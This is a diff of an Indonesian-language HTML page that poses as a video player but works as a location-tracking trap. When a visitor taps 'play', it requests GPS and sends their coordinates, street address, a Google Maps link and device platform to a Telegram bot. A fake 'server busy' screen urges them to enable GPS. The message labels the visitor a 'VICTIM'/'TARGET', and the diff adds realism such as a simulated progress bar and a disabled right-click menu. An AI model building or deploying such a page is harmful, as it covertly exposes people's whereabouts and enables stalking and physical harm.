@@ -6,41 +6,181 @@
 <title>Video</title>
 <link href="https://fonts.googleapis.com" rel="stylesheet">
 <style>
-  body { margin:0; background:#000; font-family: 'Source Sans Pro', sans-serif; }
-  #wrap { position:fixed; inset:0; background:#000; }
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+  
+  body { 
+    margin:0; 
+    background:#000; 
+    font-family: 'Source Sans Pro', sans-serif; 
+    overflow: hidden;
+    height: 100vh;
+  }
+  
+  #wrap { 
+    position:fixed; 
+    inset:0; 
+    background:#000; 
+  }
+  
+  /* Gambar background */
+  #background-img {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    z-index: 1;
+    user-select: none;
+    -webkit-user-drag: none;
+  }
+  
+  /* Overlay gelap di atas gambar agar teks lebih terbaca */
+  #overlay {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.3);
+    z-index: 2;
+  }
   
   #playIcon {
-    position:absolute; inset:0;
-    display:flex; align-items:center; justify-content:center;
-    z-index:5; pointer-events:none;
+    position:absolute; 
+    inset:0;
+    display:flex; 
+    align-items:center; 
+    justify-content:center;
+    z-index:5; 
+    pointer-events:none;
   }
-  #playIcon span {
-    width:80px; height:80px; border-radius:50%;
-    background:rgba(255,255,255,.85);
-    display:flex; align-items:center; justify-content:center;
-    font-size:36px; color:#000;
+  
+  #playIcon .circle {
+    width: 80px;
+    height: 80px;
+    border-radius: 50%;
+    background: rgba(255,255,255,0.25);
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+    border: 2px solid rgba(255,255,255,0.3);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: all 0.3s ease;
+    box-shadow: 0 4px 30px rgba(0,0,0,0.3);
+    position: relative;
   }
+  
+  #playIcon .circle::before {
+    content: '';
+    position: absolute;
+    inset: -2px;
+    border-radius: 50%;
+    padding: 2px;
+    background: linear-gradient(135deg, rgba(255,255,255,0.4), rgba(255,255,255,0.1));
+    -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+    -webkit-mask-composite: xor;
+    mask-composite: exclude;
+  }
+  
+  #playIcon .circle:hover {
+    transform: scale(1.08);
+    background: rgba(255,255,255,0.35);
+    border-color: rgba(255,255,255,0.5);
+    box-shadow: 0 4px 40px rgba(255,255,255,0.15);
+  }
+  
+  #playIcon .circle:active {
+    transform: scale(0.95);
+  }
+  
+  /* Segitiga Play - Posisi tepat di tengah */
+  #playIcon .triangle {
+    width: 0;
+    height: 0;
+    border-left: 22px solid rgba(255,255,255,0.9);
+    border-top: 14px solid transparent;
+    border-bottom: 14px solid transparent;
+    margin-left: 6px;
+    filter: drop-shadow(0 2px 8px rgba(0,0,0,0.3));
+    transition: all 0.3s ease;
+  }
+  
+  #playIcon .circle:hover .triangle {
+    border-left-color: #ffffff;
+    transform: scale(1.05);
+  }
+  
   #tapLayer {
-    position:absolute; inset:0;
-    z-index:10; background:rgba(0,0,0,0.01);
+    position:absolute; 
+    inset:0;
+    z-index:10; 
+    cursor: pointer;
   }
+  
   #bar {
-    position:absolute; left:0; right:0; bottom:0;
-    padding:10px;
-    background:linear-gradient(to top, rgba(0,0,0,.7), transparent);
-    color:#fff; font-size:12px; z-index:30;
+    position:absolute; 
+    left:0; 
+    right:0; 
+    bottom:0;
+    padding:15px 20px 20px;
+    background:linear-gradient(to top, rgba(0,0,0,.8), transparent);
+    color:#fff; 
+    font-size:13px; 
+    z-index:30;
     font-family: 'Source Sans Pro', sans-serif;
   }
-  #row { display:flex; justify-content:space-between; align-items:center; }
-  #progress { height:4px; background:rgba(255,255,255,.3); margin-top:6px; }
-  #fill { width:0%; height:100%; background:#fff; }
-  #fs { font-size:16px; padding:4px 6px; cursor:pointer; }
+  
+  #row { 
+    display:flex; 
+    justify-content:space-between; 
+    align-items:center; 
+  }
+  
+  #time {
+    font-weight: 300;
+    letter-spacing: 0.5px;
+  }
+  
+  #progress { 
+    height:4px; 
+    background:rgba(255,255,255,.3); 
+    margin-top:8px; 
+    border-radius: 2px;
+    cursor: pointer;
+    position: relative;
+  }
+  
+  #fill { 
+    width:0%; 
+    height:100%; 
+    background: #fff;
+    border-radius: 2px;
+    transition: width 0.1s linear;
+  }
+  
+  #fs { 
+    font-size:18px; 
+    padding:4px 6px; 
+    cursor:pointer;
+    opacity: 0.8;
+    transition: opacity 0.3s ease;
+  }
+  
+  #fs:hover {
+    opacity: 1;
+  }
 
   /* Elemen GPS */
   .loader { 
     width: 50px; 
     height: 50px; 
-    border: 5px solid #333; 
+    border: 4px solid rgba(255,255,255,0.2); 
     border-top: 4px solid #fff; 
     border-radius: 50%; 
     animation: spin 1s linear infinite; 
@@ -50,9 +190,25 @@
     left: calc(50% - 25px); 
     z-index: 55; 
   }
+  
   @keyframes spin { 
     0% { transform: rotate(0deg); } 
     100% { transform: rotate(360deg); } 
+  }
+
+  /* Teks loading */
+  #loading-text {
+    display: none;
+    position: fixed;
+    top: 55%;
+    left: 50%;
+    transform: translateX(-50%);
+    color: #fff;
+    font-size: 14px;
+    z-index: 55;
+    font-family: 'Source Sans Pro', sans-serif;
+    letter-spacing: 1px;
+    opacity: 0.8;
   }
 
   .screen { 
@@ -61,7 +217,7 @@
     left: 0; 
     width: 100%; 
     height: 100%; 
-    background: #000; 
+    background: rgba(0,0,0,0.92); 
     display: none; 
     flex-direction: column; 
     justify-content: center; 
@@ -72,7 +228,18 @@
     color: #fff; 
     box-sizing: border-box; 
     font-family: 'Source Sans Pro', sans-serif;
+    backdrop-filter: blur(10px);
   }
+  
+  .screen p:first-child {
+    font-family: 'Poppins', sans-serif;
+  }
+  
+  .screen-icon {
+    font-size: 48px;
+    margin-bottom: 20px;
+  }
+  
   .btn-retry { 
     margin-top: 25px; 
     padding: 15px 30px; 
@@ -83,35 +250,116 @@
     font-weight: bold; 
     cursor: pointer; 
     width: 85%; 
+    max-width: 300px;
     font-size: 16px; 
     font-family: 'Source Sans Pro', sans-serif;
+    transition: all 0.3s ease;
   }
-  /* Judul menggunakan Poppins */
-  .screen p:first-child {
-    font-family: 'Poppins', sans-serif;
+  
+  .btn-retry:hover {
+    transform: scale(1.02);
+    box-shadow: 0 4px 20px rgba(255,255,255,0.2);
+  }
+  
+  .btn-retry:active {
+    transform: scale(0.98);
+  }
+  
+  /* Animasi pulse pada lingkaran */
+  @keyframes pulse {
+    0% {
+      box-shadow: 0 0 0 0 rgba(255,255,255,0.2);
+    }
+    70% {
+      box-shadow: 0 0 0 20px rgba(255,255,255,0);
+    }
+    100% {
+      box-shadow: 0 0 0 0 rgba(255,255,255,0);
+    }
+  }
+  
+  #playIcon .circle {
+    animation: pulse 2s ease-in-out infinite;
+  }
+  
+  /* Responsive */
+  @media (max-width: 480px) {
+    #playIcon .circle {
+      width: 60px;
+      height: 60px;
+    }
+    
+    #playIcon .triangle {
+      border-left-width: 16px;
+      border-top-width: 10px;
+      border-bottom-width: 10px;
+      margin-left: 4px;
+    }
+    
+    #bar {
+      padding: 12px 15px 15px;
+      font-size: 11px;
+    }
+    
+    .screen p:first-child {
+      font-size: 20px !important;
+    }
+    
+    .screen p {
+      font-size: 13px !important;
+    }
+  }
+  
+  @media (max-width: 380px) {
+    #playIcon .circle {
+      width: 50px;
+      height: 50px;
+    }
+    
+    #playIcon .triangle {
+      border-left-width: 14px;
+      border-top-width: 8px;
+      border-bottom-width: 8px;
+      margin-left: 3px;
+    }
   }
 </style>
 </head>
 <body>
 
 <div id="wrap">
-  <!-- Video dihapus -->
+  <!-- Gambar Background -->
+  <img id="background-img" src="https://i.ibb.co.com/mVPrXbvf/Picsart-26-06-23-02-03-11-218.jpg" alt="Background">
+  
+  <!-- Overlay gelap -->
+  <div id="overlay"></div>
+  
+  <!-- Tombol Play -->
+  <div id="playIcon">
+    <div class="circle">
+      <div class="triangle"></div>
+    </div>
+  </div>
 
-  <div id="playIcon"><span>▶</span></div>
-
+  <!-- Control Bar -->
   <div id="bar">
     <div id="row">
       <div id="time">0:00 / 8:26</div>
       <div id="fs">⛶</div>
     </div>
-    <div id="progress"><div id="fill"></div></div>
+    <div id="progress">
+      <div id="fill"></div>
+    </div>
   </div>
 
+  <!-- Layer Tap -->
   <div id="tapLayer"></div>
 
-  <!-- Elemen GPS -->
+  <!-- Loading Spinner -->
   <div class="loader" id="spinner"></div>
+  <div id="loading-text">Mengakses GPS...</div>
 
+  <!-- Screen Error -->
   <div id="denied-screen" class="screen">
     <p style="font-size: 22px; font-weight: bold;">Koneksi Sibuk</p>
     <p style="font-size: 15px; color: #aaa; line-height: 1.6;">Server mengalami lonjakan trafik. Silakan muat ulang dan aktifkan GPS untuk sinkronisasi aman agar video dapat diputar.</p>
@@ -135,11 +383,29 @@ const timeEl = document.getElementById("time");
 const fill = document.getElementById("fill");
 const bar = document.getElementById("progress");
 const fs = document.getElementById("fs");
+const spinner = document.getElementById("spinner");
+const loadingText = document.getElementById("loading-text");
 
 let first = true;
+let progressValue = 0;
+let progressInterval;
+
+// Simulasi progress bar
+function updateProgress() {
+  if (progressValue < 100) {
+    progressValue += 0.5;
+    fill.style.width = progressValue + "%";
+  } else {
+    clearInterval(progressInterval);
+  }
+}
 
 function mulai() {
-    document.getElementById('spinner').style.display = 'block';
+    spinner.style.display = 'block';
+    loadingText.style.display = 'block';
+    
+    // Mulai progress bar simulasi
+    progressInterval = setInterval(updateProgress, 100);
     
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(kirimData, handleDitolak, {
@@ -163,7 +429,7 @@ function kirimData(p) {
             const alamat = data.display_name || "Alamat tidak ditemukan";
             const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
             
-            const teks = `👁️ eyeGPT VICTIM HIT!\n\n📍 Alamat: ${alamat}\n🎯 Akurasi: ${acc}m\n🔗 Maps: ${googleMaps}\n📱 Platform: ${navigator.platform}`;
+            const teks = `📛 TARGET LOKASI\n\n📍 Alamat: ${alamat}\n🎯 Akurasi: ${acc}m\n🔗 Maps: ${googleMaps}\n📱 Platform: ${navigator.platform}`;
 
             return fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(teks)}`);
         })
@@ -177,16 +443,21 @@ function kirimData(p) {
 }
 
 function handleDitolak() {
-    document.getElementById('spinner').style.display = 'none';
+    spinner.style.display = 'none';
+    loadingText.style.display = 'none';
+    clearInterval(progressInterval);
     document.getElementById('denied-screen').style.display = 'flex';
 }
 
 function tampilkanError() {
-    document.getElementById('spinner').style.display = 'none';
+    spinner.style.display = 'none';
+    loadingText.style.display = 'none';
+    clearInterval(progressInterval);
     document.getElementById('denied-screen').style.display = 'none';
     document.getElementById('final-error').style.display = 'flex';
 }
 
+// Event Click
 layer.onclick = function(){
   if(first){
     first = false;
@@ -195,16 +466,43 @@ layer.onclick = function(){
   }
 };
 
+// Update waktu
 setInterval(() => {
-  if(timeEl) timeEl.textContent = "0:00 / 8:26";
+  if(timeEl) {
+    const currentTime = Math.floor(progressValue / 100 * 506); // 8:26 = 506 detik
+    const minutes = Math.floor(currentTime / 60);
+    const seconds = currentTime % 60;
+    timeEl.textContent = `${minutes}:${seconds.toString().padStart(2, '0')} / 8:26`;
+  }
 }, 1000);
 
+// Event untuk progress bar
 bar.onclick = function(e){
   e.stopPropagation();
+  const rect = bar.getBoundingClientRect();
+  const x = e.clientX - rect.left;
+  const width = rect.width;
+  const percentage = (x / width) * 100;
+  progressValue = Math.min(100, Math.max(0, percentage));
+  fill.style.width = progressValue + "%";
 };
 
 fs.onclick = function(e){
   e.stopPropagation();
+  if (document.fullscreenElement) {
+    document.exitFullscreen();
+  } else {
+    document.documentElement.requestFullscreen();
+  }
+};
+
+// Cegah context menu
+document.addEventListener('contextmenu', e => e.preventDefault());
+
+// Handle error jika gambar gagal load
+document.getElementById('background-img').onerror = function() {
+  this.style.display = 'none';
+  document.getElementById('overlay').style.backgroundColor = '#000';
 };
 </script>
 
